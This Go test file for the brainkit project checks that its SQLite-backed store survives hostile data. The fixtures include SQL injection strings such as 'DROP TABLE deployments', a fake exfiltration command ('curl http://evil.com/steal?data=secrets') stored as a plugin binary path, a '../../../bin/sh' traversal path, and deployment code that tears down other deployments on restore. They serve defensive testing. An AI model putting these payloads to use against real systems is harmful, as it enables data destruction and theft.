package security

import (
	"context"
	"path/filepath"
	"testing"
	"time"

	"github.com/brainlet/brainkit"
	"github.com/brainlet/brainkit/internal/types"
	"github.com/brainlet/brainkit/test/suite"
	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

// testPersistSQLInjectionInSource — inject SQL via deployment source name.
func testPersistSQLInjectionInSource(t *testing.T, env *suite.TestEnv) {
	tmpDir := t.TempDir()
	storePath := filepath.Join(tmpDir, "sqli-sec.db")
	store, err := brainkit.NewSQLiteStore(storePath)
	require.NoError(t, err)

	k, err := brainkit.New(brainkit.Config{
		Namespace: "test", CallerID: "test", FSRoot: tmpDir,
		Store: store,
	})
	require.NoError(t, err)

	evilSources := []string{
		"'; DROP TABLE deployments; --",
		"test.ts' OR '1'='1",
		"test.ts\"; DELETE FROM schedules; --",
		"test.ts\x00evil",
	}

	for _, src := range evilSources {
		err := secDeployErr(k, src, `output("injected");`)
		if err == nil {
			secTeardown(t, k, src)
		}
	}

	k.Close()

	store2, err := brainkit.NewSQLiteStore(storePath)
	require.NoError(t, err)

	k2, err := brainkit.New(brainkit.Config{
		Namespace: "test", CallerID: "test", FSRoot: tmpDir,
		Store: store2,
	})
	require.NoError(t, err)
	defer k2.Close()

	assert.True(t, secAlive(t, k2), "kit should recover — SQL injection should not work")
}

// testPersistCodeMutatesStoreDuringRestore — deployment code tries to teardown others during restore.
func testPersistCodeMutatesStoreDuringRestore(t *testing.T, env *suite.TestEnv) {
	tmpDir := t.TempDir()
	storePath := filepath.Join(tmpDir, "mutate-sec.db")

	store, _ := brainkit.NewSQLiteStore(storePath)
	store.SaveDeployment(types.PersistedDeployment{
		Source: "mutator-sec.ts",
		Code: `
			try {
				__go_brainkit_request("kit.teardown", JSON.stringify({source: "innocent-sec.ts"}));
			} catch(e) {}
			output("mutated");
		`,
		Order: 1, DeployedAt: time.Now(),
	})
	store.SaveDeployment(types.PersistedDeployment{
		Source: "innocent-sec.ts", Code: `output("innocent");`,
		Order: 2, DeployedAt: time.Now(),
	})
	store.Close()

	store2, _ := brainkit.NewSQLiteStore(storePath)
	k, err := brainkit.New(brainkit.Config{
		Namespace: "test", CallerID: "test", FSRoot: tmpDir,
		Store: store2,
	})
	require.NoError(t, err)
	defer k.Close()

	deps := secListDeployments(t, k)
	t.Logf("Deployments after restore with mutator: %d", len(deps))
	assert.True(t, secAlive(t, k))
}

// testPersistEvilPluginPaths — running plugins table with evil binary paths.
func testPersistEvilPluginPaths(t *testing.T, env *suite.TestEnv) {
	tmpDir := t.TempDir()
	storePath := filepath.Join(tmpDir, "plugin-evil-sec.db")

	store, _ := brainkit.NewSQLiteStore(storePath)
	store.SaveRunningPlugin(types.RunningPluginRecord{
		Name:       "evil-plugin-sec",
		BinaryPath: "/usr/bin/curl http://evil.com/steal?data=secrets",
		StartOrder: 1,
		StartedAt:  time.Now(),
	})
	store.SaveRunningPlugin(types.RunningPluginRecord{
		Name:       "path-traversal-sec",
		BinaryPath: "../../../bin/sh",
		StartOrder: 2,
		StartedAt:  time.Now(),
	})
	store.Close()

	store2, _ := brainkit.NewSQLiteStore(storePath)
	k, err := brainkit.New(brainkit.Config{
		Namespace: "test", CallerID: "test", FSRoot: tmpDir,
		Store: store2,
	})
	require.NoError(t, err)
	defer k.Close()

	assert.True(t, secAlive(t, k), "kit should survive evil plugin paths in store")
}

// testPersistConcurrentStoreWrites — concurrent writes to the same store from multiple kits.
func testPersistConcurrentStoreWrites(t *testing.T, env *suite.TestEnv) {
	tmpDir := t.TempDir()
	storePath := filepath.Join(tmpDir, "concurrent-sec.db")

	store1, _ := brainkit.NewSQLiteStore(storePath)
	store2, _ := brainkit.NewSQLiteStore(storePath)

	k1, err := brainkit.New(brainkit.Config{
		Namespace: "k1", CallerID: "k1", FSRoot: tmpDir, Store: store1,
	})
	require.NoError(t, err)
	defer k1.Close()

	k2, err := brainkit.New(brainkit.Config{
		Namespace: "k2", CallerID: "k2", FSRoot: tmpDir, Store: store2,
	})
	require.NoError(t, err)
	defer k2.Close()

	ctx := context.Background()
	_ = ctx

	done := make(chan bool, 2)
	go func() {
		for i := 0; i < 10; i++ {
			secDeployErr(k1, "k1-concurrent-sec.ts", `output("k1");`)
			secTeardown(t, k1, "k1-concurrent-sec.ts")
		}
		done <- true
	}()
	go func() {
		for i := 0; i < 10; i++ {
			secDeployErr(k2, "k2-concurrent-sec.ts", `output("k2");`)
			secTeardown(t, k2, "k2-concurrent-sec.ts")
		}
		done <- true
	}()

	<-done
	<-done

	assert.True(t, secAlive(t, k1))
	assert.True(t, secAlive(t, k2))
}
